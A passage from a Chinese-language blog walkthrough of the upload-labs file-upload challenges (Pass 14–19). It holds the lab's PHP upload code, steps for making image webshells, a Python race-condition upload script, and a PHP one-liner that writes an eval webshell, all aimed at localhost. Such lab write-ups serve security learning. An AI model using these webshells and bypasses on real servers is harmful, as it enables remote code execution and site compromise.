     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>应该还是检查文件头来判断MIME类型，图片马依然有效</p>
<h2 id="Pass14-16图形马制作"><a href="#Pass14-16图形马制作" class="headerlink" title="Pass14-16图形马制作"></a>Pass14-16图形马制作</h2><p>其实这三关都可以通过上传图形马的方式来解决，但上传图形马之后还需要一个php文件来include这个图形马的内容【该题中可以修改利用readme.php】，那么接下来就介绍制作图形马的方法：</p>
<h3 id="cmd下执行命令【powershell不行】"><a href="#cmd下执行命令【powershell不行】" class="headerlink" title="cmd下执行命令【powershell不行】"></a>cmd下执行命令【powershell不行】</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy gg.jpg/b+base.php/a picma.jpg</span><br></pre></td></tr></table></figure>

<p>这种方法比较简单，但是有时因为图片不确定的原因可能会出一些错误，所以第二种方法比较好：</p>
<h3 id="010editor修改文件头制作"><a href="#010editor修改文件头制作" class="headerlink" title="010editor修改文件头制作"></a>010editor修改文件头制作</h3><p>我们先写一个一句话木马base.php,然后用010editor打开修改文件头：</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/14-1.png" alt="14-1"></p>
<p>gif：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">474946383961</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/14-2.png" alt="14-2"></p>
<p>jpg：【有点问题】</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FFD8FFE000104A464946</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/14-3.png" alt="14-3"></p>
<p>png:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">89504E470D0A1A0A</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/14-4.png" alt="14-4"></p>
<h2 id="Pass17【二次渲染】"><a href="#Pass17【二次渲染】" class="headerlink" title="Pass17【二次渲染】"></a>Pass17【二次渲染】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagepng</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromgif</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagegif</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filetype = $_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;];		//MIME类型，其实也就是后缀</span><br></pre></td></tr></table></figure>

<p>如果单纯是要过这一关，那么直接将base.php后缀改成了base.jpg就可以了，虽然显示上传失败，但后台其实已经成功了。</p>
<p>但如果想真正绕过二次渲染，得有专门的图片马。</p>
<h3 id="小发现3"><a href="#小发现3" class="headerlink" title="小发现3"></a>小发现3</h3><p>制作绕过二次渲染的图片马</p>
<h2 id="Pass18【条件竞争】"><a href="#Pass18【条件竞争】" class="headerlink" title="Pass18【条件竞争】"></a>Pass18【条件竞争】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们审计代码，发现首先上传文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(move_uploaded_file($temp_file, $upload_file))&#123;</span><br></pre></td></tr></table></figure>

<p>然后检查后缀，如果上传成功则重命名。</p>
<p>如果上传失败，则删除文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unlink($upload_file);</span><br></pre></td></tr></table></figure>



<p>这里我们可以利用条件竞争写python脚本。</p>
<p>我们要上传一个info.php文件，里面的内容是像文件夹写入一个一句话木马脚本，可是它的后缀是php会被删除，那么我们就只能利用条件竞争，使info.php在被unlink之前就访问到它，使其中的写入代码执行。</p>
<p>具体脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CompeteUpload</span>(<span class="params"><span class="built_in">list</span></span>):</span><br><span class="line">    url=<span class="string">&quot;http://localhost/uplab/Pass-18/index.php&quot;</span></span><br><span class="line">    geturl=<span class="string">&quot;http://localhost/uplab/upload/info.php&quot;</span></span><br><span class="line">    upfile=&#123;<span class="string">&#x27;upload_file&#x27;</span>:(<span class="string">&#x27;info.php&#x27;</span>,<span class="built_in">open</span>(<span class="string">&quot;write.php&quot;</span>,<span class="string">&#x27;rb&#x27;</span>),<span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">    data=&#123;<span class="string">&#x27;submit&#x27;</span>:<span class="string">&#x27;上传&#x27;</span>&#125;</span><br><span class="line">    r=requests.post(url=url,data=data,files=upfile)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;test upload....&quot;</span>)</span><br><span class="line">    r1=requests.get(url=geturl)</span><br><span class="line">    <span class="keyword">if</span> r1.status_code==<span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;upload success!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pool = Pool(<span class="number">10</span>)		 <span class="comment">#创建拥有10个进程数量的进程池</span></span><br><span class="line">    pool.<span class="built_in">map</span>(CompeteUpload, <span class="built_in">range</span>(<span class="number">1000</span>))    <span class="comment">#执行函数1000次</span></span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中write.php内容如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;a1batr0ss&quot;]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>







<h2 id="Pass19【条件竞争-apache解析漏洞】"><a href="#Pass19【条件竞争-apache解析漏洞】" class="headerlink" title="Pass19【条件竞争+apache解析漏洞】"></a>Pass19【条件竞争+apache解析漏洞】</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =<span class="title function_ invoke__">time</span>();</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> <span class="title class_">MyUpload</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;<span class="title function_ invoke__">upload</span>(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$status_code</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">3</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">4</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">5</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">6</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;未知错误！&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$cls_arr_ext_accepted</span> = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isUploadedFile</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setDir</span>( <span class="variable">$dir</span> );</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = 